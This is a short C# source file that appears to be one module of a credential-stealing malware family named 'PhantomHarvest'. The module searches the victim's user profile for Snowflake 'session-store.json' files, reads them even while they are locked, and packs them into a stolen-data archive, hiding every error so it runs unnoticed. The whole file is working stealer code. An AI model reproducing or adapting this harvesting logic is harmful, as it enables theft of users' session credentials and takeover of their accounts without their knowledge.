using System;
using System.IO;
using PhantomHarvest.Helper;

namespace PhantomHarvest.FTPs
{
	internal class Snowflake
	{
		public static void Collect(ArchiveManager zip)
		{
			try
			{
				string profilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".snowflake");
				if (Directory.Exists(profilePath))
				{
					string[] files = Directory.GetFiles(profilePath, "session-store.json", SearchOption.AllDirectories);
					foreach (string file in files)
					{
						try
						{
							byte[] fileBytes = LockedFile.ReadLockedFile(file);
							if (fileBytes != null)
							{
								using (MemoryStream ms = new MemoryStream(fileBytes))
								{
									zip.AddStream(ArchiveManager.Compression.Deflate, Snowflake.FTPName + "/session-store.json", ms, DateTime.Now, "");
								}
							}
						}
						catch {}
					}
				}
			}
			catch
			{
			}
		}

		public static string FTPName = "Snowflake";
	}
}
